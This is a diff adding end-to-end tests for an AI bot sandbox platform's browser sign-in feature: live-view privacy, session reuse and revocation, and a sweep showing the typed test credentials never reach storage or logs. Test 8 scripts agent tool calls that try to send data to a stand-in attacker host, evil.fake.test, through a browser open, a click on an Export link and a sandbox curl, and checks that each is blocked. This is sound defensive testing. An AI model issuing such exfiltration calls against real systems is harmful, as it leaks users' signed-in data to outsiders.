@@ -4,10 +4,18 @@ import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { type APIRequestContext, expect, test } from "@playwright/test";
 import { BROWSER_TOOL_NAMES, SANDBOX_TOOL_NAMES } from "../../packages/contracts/src/bot-capabilities";
-import { apiAs, ensureMember, SAM } from "../support/actors";
-import { enableBotSandbox, enableSandboxOrg, killSwitch, organizationOf, resume } from "../support/sandbox";
+import { apiAs, BASE_URL, ensureMember, SAM } from "../support/actors";
+import {
+  enableBotSandbox,
+  enableSandboxOrg,
+  fakeSiteStats,
+  killSwitch,
+  organizationOf,
+  resume,
+  useFakeSites,
+} from "../support/sandbox";
 import { asSuperuser } from "../support/superuser";
-import { ADMIN } from "../tests/env";
+import { ADMIN, API_URL } from "../tests/env";
 
 /**
  * Phase 07.8 tracer, end to end (07.8-08 Task 1; D-01, D-02, D-09, SBX-01, SBX-02): a REAL OpenClaw cell (started by
@@ -61,7 +69,7 @@ function passed(step: number) {
 
 function record() {
   const file = process.env.OCW_PROOF_STATE;
-  if (file) writeFileSync(file, JSON.stringify({ ...state, nonce: NONCE }, null, 2));
+  if (file) writeFileSync(file, JSON.stringify({ ...state, nonce: NONCE, journey }, null, 2));
 }
 
 // ---------------------------------------------------------------- docker (read-only inspection of the e2e namespace)
@@ -114,7 +122,14 @@ const runningOfOrg = () =>
 
 // ---------------------------------------------------------------- chat through the API
 
-type Message = { id: string; seq: number; authorKind: string; authorId: string | null; body: string };
+type Message = {
+  id: string;
+  seq: number;
+  authorKind: string;
+  authorId: string | null;
+  body: string;
+  card?: unknown;
+};
 
 async function post(api: APIRequestContext, dm: string, text: string): Promise<Message> {
   const res = await api.post(`/api/v1/conversations/${dm}/messages`, { data: { body: text } });
@@ -122,8 +137,17 @@ async function post(api: APIRequestContext, dm: string, text: string): Promise<M
   return (await res.json()) as Message;
 }
 
-/** The first bot message after `asked` (the reply to it). */
-async function replyTo(api: APIRequestContext, dm: string, asked: Message, timeout = REAL): Promise<string> {
+/**
+ * The first bot message after `asked` (the reply to it); a platform card the bot's call posted is not its reply, and
+ * with `mentioning`, a reply to another turn (a card-action turn arriving late) is skipped.
+ */
+async function replyTo(
+  api: APIRequestContext,
+  dm: string,
+  asked: Message,
+  timeout = REAL,
+  mentioning?: string,
+): Promise<string> {
   let reply = "";
   await expect
     .poll(
@@ -131,7 +155,10 @@ async function replyTo(api: APIRequestContext, dm: string, asked: Message, timeo
         const res = await api.get(`/api/v1/conversations/${dm}/messages?after=${asked.seq}&limit=50`);
         if (!res.ok()) return "";
         const page = (await res.json()) as { messages: Message[] };
-        reply = page.messages.find((m) => m.authorKind === "agent")?.body ?? "";
+        reply =
+          page.messages.find(
+            (m) => m.authorKind === "agent" && !m.card && (!mentioning || m.body.includes(mentioning)),
+          )?.body ?? "";
         return reply;
       },
       { timeout, intervals: [500, 1000] },
@@ -150,7 +177,7 @@ async function ask(api: APIRequestContext, dm: string, text: string, tool = "ocw
   for (let attempt = 1; ; attempt++) {
     const started = Date.now();
     const asked = await post(api, dm, text);
-    const reply = await replyTo(api, dm, asked);
+    const reply = await replyTo(api, dm, asked, REAL, `Tool ${tool}`);
     if (!reply.includes(`Tool ${tool} not offered`) || Date.now() > deadline) {
       console.log(`[proof] reply (${Date.now() - started} ms, attempt ${attempt}): ${reply}`);
       return { reply, ms: Date.now() - started, asked, attempts: attempt };
@@ -413,4 +440,484 @@ test("5. after the resume, the sandbox environment holds no token and no OCW_ na
   const env = sbxOf(state.scoutId).Config.Env ?? [];
   clean(env.join("\n"), "the sbx container environment");
   passed(5);
+});
+
+// ================================================================ 07.8-28: the sign-in journey with real Chromium
+
+/**
+ * Steps 6-10 (07.8-28 Task 2; D-05, D-06, D-07, D-08, D-11 F-5, D-12 U-2, D-13; BRW-02…04; P-10, P-18): the real cell,
+ * the real API, the real sandboxd, the real `brw` (Chromium) and the fake sites `scripts/e2e-isolated.sh --sandbox`
+ * started. A team bot (Guide) owned by Ana, Sam's DM with it: the bot opens the site and asks Sam to sign in; Sam takes
+ * control over the real live-view socket and types the four E1 strings; Ana (the bot's owner) and Sam's second device
+ * receive no frame while he controls the page or while his session is loaded; the bot continues signed in; three ways to
+ * carry what it saw to evil.fake.test each stop (the fake site's /collect stays 0); none of the four strings is in any
+ * store or log; the session is reused, revoked, and never another member's.
+ *
+ * Guide is a TEAM bot so that someone other than Sam (its owner) can watch the page (U-2 needs a second person): its
+ * shell after the sign-in is therefore refused `member_data` (P-11), stricter than the personal-bot approval
+ * (leak-sweep.int proves that path at API level).
+ */
+
+const PANEL = "panel.fake.test:8080";
+const EVIL = "evil.fake.test:8080";
+const E1 = {
+  username: "ana@example.test",
+  password: "S3cr3t-Hunter2-OCW",
+  otp: "735190",
+  revealed: "Visible-Secret-99",
+};
+/** Fixed CSS boxes of the fake sign-in page (infra/sandbox/test/fake-site.mjs LOGIN_LAYOUT). */
+const LOGIN = {
+  email: { x: 200, y: 138 },
+  password: { x: 170, y: 198 },
+  toggle: { x: 370, y: 198 },
+  otp: { x: 120, y: 258 },
+  submit: { x: 100, y: 320 },
+};
+const APPROVAL_SENTENCE = "This action needs approval.";
+const MEMBER_DATA_SENTENCE = "so I can't change my sandbox or run commands";
+
+const journey = {
+  guideId: "",
+  dm: "",
+  anaDm: "",
+  contextId: "",
+  sessionId: "",
+  takeAt: 0,
+  /** When Sam's signed-in page ended (the revoke): frames to others are allowed again after it. */
+  privateUntil: 0,
+  anaFrames: [] as number[],
+  otherDeviceFrames: [] as number[],
+  controllerFrames: 0,
+  pendingApprovals: 0,
+  collectHits: -1,
+  signInMs: 0,
+};
+
+interface Live {
+  ws: WebSocket;
+  json: Array<Record<string, unknown>>;
+  frames: number[];
+  send(frame: unknown): void;
+  state(): string | undefined;
+  close(): void;
+}
+
+/** A live-view socket as the web opens it: the web origin and the `ocw.auth.<jwt>` subprotocol of `api`'s member. */
+async function liveSocket(api: APIRequestContext, contextId: string): Promise<Live> {
+  const res = await api.get("/api/auth/token");
+  expect(res.ok(), "GET /api/auth/token").toBe(true);
+  const { token } = (await res.json()) as { token: string };
+  const url = `${API_URL.replace(/^http/u, "ws")}/api/v1/live/browser/${contextId}`;
+  // Node's WebSocket (undici) takes the handshake headers in its init: the live view checks the Origin.
+  const ws = new WebSocket(url, {
+    protocols: ["ocw.v1", `ocw.auth.${token}`],
+    headers: { origin: BASE_URL },
+  } as unknown as string[]);
+  ws.binaryType = "arraybuffer";
+  const json: Array<Record<string, unknown>> = [];
+  const frames: number[] = [];
+  ws.onmessage = (ev) => {
+    if (typeof ev.data === "string") json.push(JSON.parse(ev.data) as Record<string, unknown>);
+    else frames.push(Date.now());
+  };
+  await new Promise<void>((resolve, reject) => {
+    ws.onopen = () => resolve();
+    ws.onerror = () => reject(new Error(`live view ${contextId}: the socket did not open`));
+  });
+  return {
+    ws,
+    json,
+    frames,
+    send: (frame) => ws.send(JSON.stringify(frame)),
+    state: () => [...json].reverse().find((f) => f.type === "state")?.state as string | undefined,
+    close: () => ws.close(),
+  };
+}
+
+async function waitState(l: Live, state: string, timeout = 20_000) {
+  await expect.poll(() => l.state(), { timeout, message: `live view state ${state}` }).toBe(state);
+}
+
+const clickAt = (p: { x: number; y: number }) => [
+  { type: "mouse", event: "move", x: p.x, y: p.y, button: "none" },
+  { type: "mouse", event: "down", x: p.x, y: p.y, button: "left" },
+  { type: "mouse", event: "up", x: p.x, y: p.y, button: "left" },
+];
+const PUNCT: Record<string, string> = {
+  "@": "Digit2",
+  "-": "Minus",
+  ".": "Period",
+  _: "Minus",
+  " ": "Space",
+};
+const keyFrames = (s: string) =>
+  [...s].flatMap((ch) => {
+    const code = /[a-z]/iu.test(ch)
+      ? `Key${ch.toUpperCase()}`
+      : /[0-9]/u.test(ch)
+        ? `Digit${ch}`
+        : (PUNCT[ch] ?? "Unidentified");
+    const modifiers = /[A-Z@_]/u.test(ch) ? 8 : 0;
+    return [
+      { type: "key", event: "down", key: ch, code, modifiers },
+      { type: "key", event: "up", key: ch, code, modifiers },
+    ];
+  });
+
+/** Sends frames one by one with a short gap (a person's input, never a burst the page could drop). */
+async function typeInto(l: Live, frames: unknown[]) {
+  for (const f of frames) {
+    l.send(f);
+    await new Promise((r) => setTimeout(r, 15));
+  }
+}
+
+const call = (tool: string, args: Record<string, unknown>) => `[[call ${tool} ${JSON.stringify(args)}]]`;
+
+/** Every tool result the model received in the run (the fake model's request captures). */
+function toolResults(): string[] {
+  const dir = process.env.OCW_PROOF_CAPTURE_DIR ?? "";
+  return readdirSync(dir)
+    .filter((f) => f.endsWith("-openai.json"))
+    .flatMap((f) => {
+      const body = JSON.parse(readFileSync(join(dir, f), "utf8")) as {
+        messages?: Array<{ role: string; content: unknown }>;
+      };
+      return (body.messages ?? [])
+        .filter((m) => m.role === "tool")
+        .map((m) => (typeof m.content === "string" ? m.content : JSON.stringify(m.content)));
+    });
+}
+
+test("6. Sam signs in for Guide by typing in the real page through the live view; nobody else sees a frame", async () => {
+  test.setTimeout(4 * REAL);
+  const ana = await apiAs(ADMIN);
+  const sam = await apiAs(SAM);
+  // The fake sites are reachable private hosts; the shell may reach evil.fake.test (so only D-13 can stop it there).
+  await useFakeSites(ana, { sandboxEgress: "allowlist", allowHosts: [EVIL] });
+
+  const created = await ana.post("/api/v1/agents", {
+    data: {
+      name: `Guide ${NONCE.slice(0, 4)}`,
+      username: `guide${NONCE.slice(0, 6)}`,
+      instructions: "Answer briefly.",
+      modelProvider: "mock",
+      modelId: "mock-1",
+      ownerUserId: state.anaId,
+    },
+  });
+  expect(created.ok(), `create Guide: ${created.status()}`).toBe(true);
+  journey.guideId = ((await created.json()) as { id: string }).id;
+  await waitReady(ana, journey.guideId);
+  expect(await enableBotSandbox(ana, journey.guideId, { sandbox: true, browser: true })).toEqual({
+    sandbox: true,
+    browser: true,
+  });
+  await expect
+    .poll(() => confinedOf(cellAlsoAllow(journey.guideId)), { timeout: 60_000 })
+    .toEqual([...SANDBOX_TOOL_NAMES, ...BROWSER_TOOL_NAMES].sort());
+  const dm = await sam.post(`/api/v1/agents/${journey.guideId}/dm`);
+  expect(dm.ok(), "Sam's DM with Guide").toBe(true);
+  journey.dm = ((await dm.json()) as { dmId: string }).dmId;
+
+  const opened = await ask(
+    sam,
+    journey.dm,
+    `look ${call("ocw_browser_open", { url: `http://${PANEL}/app` })} ${call("ocw_browser_snapshot", {})}`,
+    "ocw_browser_open",
+  );
+  expect(opened.reply).toContain(`Tool ocw_browser_open said: Opened ${PANEL}`);
+  expect(opened.reply).toContain("Sign in");
+  const asked = await ask(
+    sam,
+    journey.dm,
+    `sign me in ${call("ocw_browser_signin", { reason: "I need the orders dashboard" })}`,
+    "ocw_browser_signin",
+  );
+  expect(asked.reply).toContain("Tool ocw_browser_signin said:");
+  const { rows } = await asSuperuser<{ context_id: string; status: string; card_message_id: string }>(
+    "select context_id, status, card_message_id from app.browser_signin_requests where agent_id = $1 order by created_at desc limit 1",
+    [journey.guideId],
+  );
+  expect(rows[0]?.status).toBe("waiting");
+  expect(rows[0]?.card_message_id).toBeTruthy();
+  journey.contextId = rows[0]?.context_id as string;
+
+  // Ana watches as Guide's owner: the page is live for her before Sam takes it.
+  const anaLive = await liveSocket(ana, journey.contextId);
+  const controller = await liveSocket(sam, journey.contextId);
+  const otherDevice = await liveSocket(sam, journey.contextId);
+  try {
+    await expect.poll(() => anaLive.frames.length, { timeout: 20_000 }).toBeGreaterThan(0);
+    controller.send({ type: "take" });
+    await waitState(controller, "controlling");
+    journey.takeAt = Date.now();
+    await waitState(anaLive, "private");
+    await waitState(otherDevice, "private");
+    const started = Date.now();
+
+    // On /app: Tab to "Sign in with a password", Enter; then the sign-in form by its fixed boxes.
+    await typeInto(controller, [
+      { type: "key", event: "down", key: "Tab", code: "Tab", modifiers: 0 },
+      { type: "key", event: "up", key: "Tab", code: "Tab", modifiers: 0 },
+      { type: "key", event: "down", key: "Enter", code: "Enter", modifiers: 0 },
+      { type: "key", event: "up", key: "Enter", code: "Enter", modifiers: 0 },
+    ]);
+    await new Promise((r) => setTimeout(r, 2_000));
+    await typeInto(controller, [...clickAt(LOGIN.email), ...keyFrames(E1.username)]);
+    await typeInto(controller, [...clickAt(LOGIN.password), ...keyFrames(E1.password)]);
+    await typeInto(controller, [...clickAt(LOGIN.otp), { type: "text", text: E1.otp }]);
+    // The show-password toggle, then more typed into the now visible field.
+    await typeInto(controller, [
+      ...clickAt(LOGIN.toggle),
+      ...clickAt(LOGIN.password),
+      { type: "text", text: E1.revealed },
+    ]);
+    const loginsBefore = fakeSiteStats().logins ?? 0;
+    await typeInto(controller, clickAt(LOGIN.submit));
+    await expect.poll(() => fakeSiteStats().logins ?? 0, { timeout: 20_000 }).toBeGreaterThan(loginsBefore);
+    journey.controllerFrames = controller.frames.length;
+    expect(journey.controllerFrames, "the controller sees the page").toBeGreaterThan(0);
+
+    controller.send({ type: "release" });
+    await expect
+      .poll(
+        async () =>
+          (
+            await asSuperuser<{ status: string; session_id: string | null }>(
+              "select status, session_id from app.browser_signin_requests where context_id = $1",
+              [journey.contextId],
+            )
+          ).rows[0]?.status,
+        { timeout: 30_000 },
+      )
+      .toBe("signed_in");
+    journey.signInMs = Date.now() - started;
+    const sealed = await asSuperuser<{ session_id: string }>(
+      "select session_id from app.browser_signin_requests where context_id = $1",
+      [journey.contextId],
+    );
+    journey.sessionId = sealed.rows[0]?.session_id as string;
+    // With Sam's session loaded on the page, Ana still sees it private (U-2).
+    await waitState(anaLive, "private");
+    // Hold the sockets open through the signed-in steps: frames to Ana are counted until the page ends.
+  } finally {
+    journey.otherDeviceFrames = otherDevice.frames.filter((t) => t >= journey.takeAt);
+    otherDevice.close();
+    controller.close();
+    liveSockets.ana = anaLive;
+  }
+  await ana.dispose();
+  await sam.dispose();
+  record();
+  passed(6);
+});
+
+const liveSockets: { ana: Live | null } = { ana: null };
+
+test("7. the bot continues signed in: a snapshot reads the dashboard", async () => {
+  test.setTimeout(REAL);
+  const sam = await apiAs(SAM);
+  const { reply } = await ask(
+    sam,
+    journey.dm,
+    `and now ${call("ocw_browser_snapshot", {})}`,
+    "ocw_browser_snapshot",
+  );
+  expect(reply).toContain("Signed in");
+  // The reply quotes 200 characters of the result; the whole snapshot the model read has the dashboard.
+  expect(toolResults().some((t) => t.includes("Signed in") && t.includes("Welcome"))).toBe(true);
+  await sam.dispose();
+  passed(7);
+});
+
+test("8. D-13: an open of evil.fake.test, a click on the Export link and a curl there each stop; /collect stays 0", async () => {
+  test.setTimeout(2 * REAL);
+  const sam = await apiAs(SAM);
+  const collectBefore = fakeSiteStats().collect ?? 0;
+  const { reply, asked } = await ask(
+    sam,
+    journey.dm,
+    `send it ${call("ocw_browser_open", { url: `http://${EVIL}/collect?d=proof` })} ${call(
+      "ocw_browser_open",
+      {
+        url: `http://${PANEL}/lock`,
+      },
+    )} ${call("ocw_browser_snapshot", {})} ${call("ocw_browser_act", { action: "click", ref: "{{ref:Export}}" })} ${call(
+      "ocw_sandbox_exec",
+      { argv: ["curl", "-s", `http://${EVIL}/collect?d=proof`] },
+    )}`,
+    "ocw_browser_open",
+  );
+  const lines = reply.split("\n");
+  console.log(`[proof] D-13 reply:\n${reply}`);
+  expect(lines[0]).toContain(`Tool ocw_browser_open said: ${APPROVAL_SENTENCE}`);
+  expect(lines[1]).toContain(`Tool ocw_browser_open said: Opened ${PANEL}`);
+  expect(toolResults().some((t) => t.includes('link "Export"'))).toBe(true);
+  // The click names the Export link's ref from that snapshot (`{{ref:Export}}`); a signed-in click waits for Sam.
+  expect(lines[3]).toContain(`Tool ocw_browser_act said: ${APPROVAL_SENTENCE}`);
+  expect(lines[4]).toContain(MEMBER_DATA_SENTENCE);
+  journey.collectHits = (fakeSiteStats().collect ?? 0) - collectBefore;
+  expect(journey.collectHits).toBe(0);
+  const event = await asSuperuser<{ event_id: string }>(
+    "select payload->>'eventId' as event_id from app.stream_events where type = 'agent.mention.v1' and payload->'message'->>'id' = $1",
+    [asked.id],
+  );
+  const pending = await asSuperuser<{ tool: string; requested_for_user_id: string; ttl_s: number }>(
+    `select t.tool, t.requested_for_user_id, extract(epoch from r.expires_at - r.created_at)::int as ttl_s
+       from app.tool_call_approvals t join app.approval_requests r on r.resource_id = t.id
+      where t.event_id = $1 and r.status = 'pending' order by r.created_at`,
+    [event.rows[0]?.event_id],
+  );
+  console.log(`[proof] pending approvals: ${JSON.stringify(pending.rows)}`);
+  expect(pending.rows.map((r) => r.tool)).toEqual(["ocw_browser_open", "ocw_browser_act"]);
+  for (const r of pending.rows) {
+    expect(r.requested_for_user_id).toBe(state.samId);
+    expect(r.ttl_s).toBeLessThanOrEqual(15 * 60 + 1);
+  }
+  journey.pendingApprovals = pending.rows.length;
+  await sam.dispose();
+  record();
+  passed(8);
+});
+
+test("9. reuse, revoke, never another member's; frames reach others again once the signed-in page ended", async () => {
+  test.setTimeout(2 * REAL);
+  const ana = await apiAs(ADMIN);
+  const sam = await apiAs(SAM);
+  // A new turn on the same site is signed in without a card.
+  const again = await ask(
+    sam,
+    journey.dm,
+    `again ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
+    "ocw_browser_open",
+  );
+  expect(again.reply).toContain("Signed in");
+  // Sam revokes: the page that had it loaded ends.
+  const revoked = await sam.delete(`/api/v1/browser-sessions/${journey.sessionId}`);
+  expect(revoked.status()).toBe(204);
+  journey.privateUntil = Date.now();
+  const anaLive = liveSockets.ana;
+  if (anaLive) {
+    const during = anaLive.frames.filter((t) => t >= journey.takeAt && t < journey.privateUntil);
+    journey.anaFrames = during;
+    anaLive.close();
+  }
+  const after = await ask(
+    sam,
+    journey.dm,
+    `once more ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
+    "ocw_browser_open",
+  );
+  expect(after.reply).toContain(`Opened ${PANEL}`);
+  expect(after.reply).not.toContain("Signed in");
+  // Ana's own DM with Guide never loads Sam's session.
+  const anaDm = await ana.post(`/api/v1/agents/${journey.guideId}/dm`);
+  journey.anaDm = ((await anaDm.json()) as { dmId: string }).dmId;
+  const theirs = await ask(
+    ana,
+    journey.anaDm,
+    `mine ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
+    "ocw_browser_open",
+  );
+  expect(theirs.reply).not.toContain("Signed in");
+  // Frames again: Ana watches the page Sam's DM has open now (no session loaded), and receives frames.
+  const { rows } = await asSuperuser<{ id: string }>(
+    "select id from app.browser_contexts where agent_id = $1 and conversation_id = $2 and closed_at is null order by opened_at desc limit 1",
+    [journey.guideId, journey.dm],
+  );
+  const watch = await liveSocket(ana, rows[0]?.id as string);
+  try {
+    await expect.poll(() => watch.frames.length, { timeout: 20_000 }).toBeGreaterThan(0);
+  } finally {
+    watch.close();
+  }
+  expect(journey.anaFrames, "Ana's frames while Sam controlled the page or his session was loaded").toEqual(
+    [],
+  );
+  expect(journey.otherDeviceFrames, "Sam's other device's frames during the takeover").toEqual([]);
+  await ana.dispose();
+  await sam.dispose();
+  record();
+  passed(9);
+});
+
+test("10. E1: none of the four strings Sam typed is in any column, audit row, stream event, log or model request", async () => {
+  test.setTimeout(REAL);
+  const needles = [E1.username, E1.password, E1.otp, E1.revealed];
+  // Every text-like column of every table (the sealed secret's ciphertext aside: it is the encrypted state itself).
+  const cols = await asSuperuser<{ table_schema: string; table_name: string; column_name: string }>(
+    `select table_schema, table_name, column_name from information_schema.columns
+      where table_schema in ('app', 'auth')
+        and (data_type in ('text', 'jsonb', 'json', 'character varying') or udt_name in ('_text', '_varchar'))`,
+    [],
+  );
+  const found: string[] = [];
+  for (const c of cols.rows) {
+    if (c.table_schema === "app" && c.table_name === "secrets" && c.column_name === "ciphertext") continue;
+    for (const needle of needles) {
+      const n = await asSuperuser<{ n: number }>(
+        `select count(*)::int as n from "${c.table_schema}"."${c.table_name}" where "${c.column_name}"::text like $1`,
+        [`%${needle}%`],
+      );
+      if ((n.rows[0]?.n ?? 0) > 0)
+        found.push(`${c.table_schema}.${c.table_name}.${c.column_name}: ${needle}`);
+    }
+  }
+  expect(found).toEqual([]);
+  const runDir = process.env.OCW_E2E_RUN_DIR ?? "";
+  const texts: Array<[string, string]> = [];
+  const noLog: string[] = [];
+  for (const f of ["api.log", "sandboxd.log"]) {
+    const p = join(runDir, f);
+    expect(existsSync(p), `${f} exists`).toBe(true);
+    texts.push([f, readFileSync(p, "utf8")]);
+  }
+  const brw = docker(
+    "ps",
+    "-aq",
+    "--filter",
+    `label=ocw.namespace=${NS}`,
+    "--filter",
+    "label=ocw.kind=brw",
+    "--filter",
+    `label=ocw.agent=${journey.guideId}`,
+  )
+    .split("\n")
+    .filter(Boolean);
+  expect(brw.length, "Guide's brw container").toBeGreaterThan(0);
+  // The brw and egress containers keep no log at all (sandboxd creates them with the `none` log driver): there is no
+  // output to read, which is checked instead (a driver that kept one would be read and swept here).
+  for (const id of [...brw, `ocw-egress-${NS}`]) {
+    const driver = docker("inspect", "-f", "{{.HostConfig.LogConfig.Type}}", id);
+    if (driver === "none") {
+      noLog.push(id);
+      continue;
+    }
+    texts.push([
+      `container ${id}`,
+      execFileSync("docker", ["logs", id], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }),
+    ]);
+  }
+  expect(noLog.length + texts.length).toBeGreaterThan(2);
+  texts.push([
+    "cell",
+    execFileSync("docker", ["logs", process.env.OCW_PROOF_CELL ?? ""], {
+      encoding: "utf8",
+      stdio: ["ignore", "pipe", "pipe"],
+    }),
+  ]);
+  const dir = process.env.OCW_PROOF_CAPTURE_DIR ?? "";
+  const captures = readdirSync(dir).filter((f) => f.endsWith(".json"));
+  expect(captures.length, "the model requests of the run").toBeGreaterThan(0);
+  for (const f of captures) texts.push([`model ${f}`, readFileSync(join(dir, f), "utf8")]);
+  const leaks = texts.flatMap(([where, text]) =>
+    needles.filter((n) => text.includes(n)).map((n) => `${where}: ${n}`),
+  );
+  console.log(
+    `[proof] E1 sweep: ${cols.rows.length} columns, ${texts.length} logs and model requests; no log kept by ${noLog.length} container(s) (brw, egress)`,
+  );
+  expect(leaks).toEqual([]);
+  passed(10);
 });
